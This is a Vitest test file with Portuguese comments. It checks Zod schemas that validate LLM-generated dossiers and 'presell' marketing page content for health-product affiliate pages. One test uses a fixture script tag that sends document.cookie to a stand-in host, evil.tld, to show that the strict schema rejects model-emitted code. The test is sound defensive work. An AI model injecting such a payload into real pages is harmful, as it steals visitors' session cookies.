import { describe, it, expect } from 'vitest';
import {
  RefinedInsightsSchema,
  PresellContentSchema,
  PresellProposalSchema,
  zodIssuesToMessage,
} from '../validations/knowledge';

const insightsValido = {
  title: 'Dossiê VSL Emagrecimento',
  headline: 'O que ninguém conta sobre metabolismo lento',
  dores: ['Efeito sanfona', 'Cansaço constante'],
  desejos: ['Voltar a usar a roupa antiga'],
  objecoes: ['Já tentei de tudo'],
  angulos: ['Alerta de fraude'],
  frases_chave: ['metabolismo travado'],
};

describe('RefinedInsightsSchema', () => {
  it('aceita o dossiê completo', () => {
    expect(RefinedInsightsSchema.parse(insightsValido)).toEqual(insightsValido);
  });

  it('rejeita array ausente — era o caso que estourava em insights.dores.map()', () => {
    const { dores, ...semDores } = insightsValido;
    const r = RefinedInsightsSchema.safeParse(semDores);
    expect(r.success).toBe(false);
    if (!r.success) expect(zodIssuesToMessage(r.error)).toContain('dores');
  });

  it('rejeita array vazio: dossiê sem nenhuma dor não serve para copy', () => {
    expect(RefinedInsightsSchema.safeParse({ ...insightsValido, dores: [] }).success).toBe(false);
  });

  it('rejeita item vazio ou só espaço dentro do array', () => {
    expect(RefinedInsightsSchema.safeParse({ ...insightsValido, dores: ['   '] }).success).toBe(false);
  });

  it('rejeita chave inventada pelo modelo (strict)', () => {
    expect(RefinedInsightsSchema.safeParse({ ...insightsValido, bonus: 'x' }).success).toBe(false);
  });

  it('rejeita tipo trocado — string onde o contrato pede array', () => {
    expect(RefinedInsightsSchema.safeParse({ ...insightsValido, dores: 'muita dor' }).success).toBe(false);
  });
});

const conteudoValido = {
  categoria: 'Saúde',
  headline: 'Entenda como o metabolismo funciona',
  subheadline: 'Uma leitura editorial sobre hábitos',
  autor: 'Redação',
  leitura_min: 5,
  abertura: 'Muita gente relata cansaço.',
  secao1_titulo: 'O que dizem os estudos',
  secao1_texto: 'Texto da seção um.',
  secao2_titulo: 'Como avaliar',
  secao2_texto: 'Texto da seção dois.',
  beneficios: ['Informação clara'],
  prova: 'Relatos de leitores.',
  cta_texto: 'Veja como funciona',
  cta_reforco: 'Resultados variam.',
  secao3_titulo: 'Considerações',
  secao3_texto: 'Texto da seção três.',
  pros: ['Conteúdo informativo'],
  contras: ['Não substitui orientação médica'],
  faq: [{ pergunta: 'Funciona para todos?', resposta: 'Resultados variam por pessoa.' }],
  cta_final: 'Leia a página oficial',
  titulo_pagina: 'Metabolismo — guia editorial',
  meta_descricao: 'Guia editorial sobre metabolismo.',
  nome_site: 'Portal Saúde Hoje',
};

describe('PresellContentSchema', () => {
  it('aceita o conteúdo mínimo completo', () => {
    expect(PresellContentSchema.parse(conteudoValido)).toMatchObject({ headline: conteudoValido.headline });
  });

  it('aceita os campos opcionais do template authority', () => {
    const r = PresellContentSchema.safeParse({
      ...conteudoValido,
      cientifico_titulo: 'O que a ciência diz',
      ingredientes: [{ nome: 'Zinco', beneficio: 'Suporte imunológico' }],
      pacotes: [{ nome: '3 potes', qtd: '3' }],
    });
    expect(r.success).toBe(true);
  });

  it('rejeita conteúdo parcial — renderizar isso escreveria "undefined" na página', () => {
    const { faq, ...semFaq } = conteudoValido;
    expect(PresellContentSchema.safeParse(semFaq).success).toBe(false);
  });

  it('rejeita faq malformado (item sem resposta)', () => {
    const r = PresellContentSchema.safeParse({
      ...conteudoValido,
      faq: [{ pergunta: 'E aí?' }],
    });
    expect(r.success).toBe(false);
  });

  it('rejeita leitura_min não inteiro ou negativo', () => {
    expect(PresellContentSchema.safeParse({ ...conteudoValido, leitura_min: 2.5 }).success).toBe(false);
    expect(PresellContentSchema.safeParse({ ...conteudoValido, leitura_min: -1 }).success).toBe(false);
  });
});

describe('PresellProposalSchema', () => {
  it('aceita explicação + conteúdo', () => {
    const r = PresellProposalSchema.safeParse({
      explanation: 'Ajustei a headline para linguagem condicional.',
      proposedContent: conteudoValido,
    });
    expect(r.success).toBe(true);
  });

  it('recusa proposedCustomCode: o LLM não emite mais código executável', () => {
    // A chave foi removida do prompt e o schema é strict — se um modelo antigo ou uma
    // injeção de prompt tentar devolvê-la, a proposta inteira é rejeitada.
    const r = PresellProposalSchema.safeParse({
      explanation: 'Proposta com código embutido.',
      proposedContent: conteudoValido,
      proposedCustomCode: '<script>fetch("https://evil.tld/?c="+document.cookie)</script>',
    });
    expect(r.success).toBe(false);
    if (!r.success) expect(zodIssuesToMessage(r.error)).toMatch(/proposedCustomCode|não reconhecid|unrecognized/i);
  });

  it('recusa proposta sem explicação', () => {
    expect(PresellProposalSchema.safeParse({ proposedContent: conteudoValido }).success).toBe(false);
  });
});

describe('zodIssuesToMessage', () => {
  it('nomeia o caminho do campo para o retry de auto-correção do LLM', () => {
    const r = RefinedInsightsSchema.safeParse({ ...insightsValido, dores: [''] });
    expect(r.success).toBe(false);
    if (!r.success) {
      const msg = zodIssuesToMessage(r.error);
      expect(msg).toContain('dores.0');
      expect(msg.length).toBeLessThanOrEqual(1000);
    }
  });
});
